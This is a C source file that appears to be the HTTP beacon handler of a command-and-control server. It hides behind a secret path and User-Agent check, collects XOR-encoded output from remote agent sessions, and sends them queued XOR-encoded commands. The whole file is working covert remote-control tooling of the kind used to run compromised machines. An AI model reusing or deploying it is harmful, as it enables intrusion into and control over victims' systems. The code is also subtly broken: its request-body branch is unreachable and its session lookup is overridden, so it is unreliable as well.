#define _POSIX_C_SOURCE 200809L
#include "Http.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

#ifndef _WIN32
#include <netinet/in.h>
#endif

static int ParseHttpRequest(const char *Raw, int RawLen, char *Method,
                            char *Path, char *Ua, char *Body, int *BodyLen) {
  (void)RawLen;
  *BodyLen = 0;
  Method[0] = Path[0] = Ua[0] = Body[0] = '\0';

  const char *Line = Raw;
  int FirstLine = 1;

  while (Line && *Line) {
    const char *End = strstr(Line, "\r\n");
    if (!End)
      break;

    int Len = (int)(End - Line);
    char Buf[BufSize];
    if (Len <= 0 || Len >= BufSize) {
      Line = End + 2;
      continue;
    }
    memcpy(Buf, Line, (size_t)Len);
    Buf[Len] = '\0';

    if (FirstLine) {
      sscanf(Buf, "%63s %255s", Method, Path);
      FirstLine = 0;
    } else if (strncasecmp(Buf, "User-Agent: ", 12) == 0) {
      int UaLen = Len - 12 < MaxUaLen - 1 ? Len - 12 : MaxUaLen - 1;
      memcpy(Ua, Buf + 12, (size_t)UaLen);
      Ua[UaLen] = '\0';
    } else if (Len == 0) {
      Line = End + 2;
      int Remaining = (int)strlen(Line);
      if (Remaining > 0) {
        int Copy = Remaining < BufSize - 1 ? Remaining : BufSize - 1;
        memcpy(Body, Line, (size_t)Copy);
        Body[Copy] = '\0';
        *BodyLen = Copy;
      }
      break;
    }

    Line = End + 2;
  }

  return Method[0] != '\0';
}

static void HttpSendResponse(NetSock Conn, const char *Body, int BodyLen) {
  char Header[512];
  int HLen = snprintf(Header, sizeof(Header),
                      "HTTP/1.1 200 OK\r\n"
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %d\r\n"
                      "Connection: close\r\n"
                      "\r\n",
                      BodyLen);
  send(Conn, Header, HLen, 0);
  if (BodyLen > 0)
    send(Conn, Body, BodyLen, 0);
}

static void HttpSend404(NetSock Conn) {
  const char *R = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
  send(Conn, R, (int)strlen(R), 0);
}

static void HttpDispatch(NetSock Conn, SessionPool *P, const Config *C,
                         const char *PeerAddr) {
  char Raw[BufSize] = {0};
  int N = recv(Conn, Raw, BufSize - 1, 0);
  if (N <= 0)
    return;
  Raw[N] = '\0';

  char Method[64], Path[256], Ua[MaxUaLen], Body[BufSize];
  int BodyLen = 0;

  if (!ParseHttpRequest(Raw, N, Method, Path, Ua, Body, &BodyLen))
    return;

  if (strcmp(Path, C->HttpPath) != 0) {
    HttpSend404(Conn);
    return;
  }
  if (strcmp(Ua, C->UserAgent) != 0) {
    HttpSend404(Conn);
    return;
  }

  char Payload[BufSize] = "Standby";
  int PayloadLen = 7;

  if (BodyLen > 0) {
    memcpy(Payload, Body, (size_t)BodyLen);
    Payload[BodyLen] = '\0';
    ApplyXor(Payload, (size_t)BodyLen);
    PayloadLen = BodyLen;
  }

  int IsNew = 1;
  AgentSession *S = NULL;

  for (int I = 0; I < P->Count; I++) {
    if (P->Slots[I].State == StateActive &&
        strcmp(P->Slots[I].Address, PeerAddr) == 0) {
      IsNew = 0;
      S = &P->Slots[I];
      S->LastSeen = time(NULL);
      break;
    }
  }

  S = PoolRegister(P, PeerAddr);
  if (!S) {
    HttpSend404(Conn);
    return;
  }

  if (IsNew)
    PoolNotifyConnect(P, S);

  int HasOutput = strcmp(Payload, "Standby") != 0;
  if (HasOutput) {
    memset(S->LastOutput, 0, BufSize);
    memcpy(S->LastOutput, Payload, (size_t)PayloadLen);
    PoolNotifyOutput(P, S);
  }

  char RespBody[BufSize];
  int RespLen;

  if (S->HasPending) {
    size_t CmdLen = strlen(S->Pending);
    memcpy(RespBody, S->Pending, CmdLen);
    ApplyXor(RespBody, CmdLen);
    RespLen = (int)CmdLen;
    memset(S->Pending, 0, BufSize);
    S->HasPending = 0;
  } else {
    memcpy(RespBody, "SLEEP", 5);
    ApplyXor(RespBody, 5);
    RespLen = 5;
  }

  HttpSendResponse(Conn, RespBody, RespLen);
}

void HttpHandleBeacon(NetSock Listener, SessionPool *P, const Config *C) {
  struct sockaddr_in Peer;
  socklen_t PeerLen = sizeof(Peer);

  NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
  if (Conn == NetInvalid)
    return;

  char PeerAddr[AddrSize];
  strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);

  HttpDispatch(Conn, P, C, PeerAddr);
  NetClose(Conn);
}
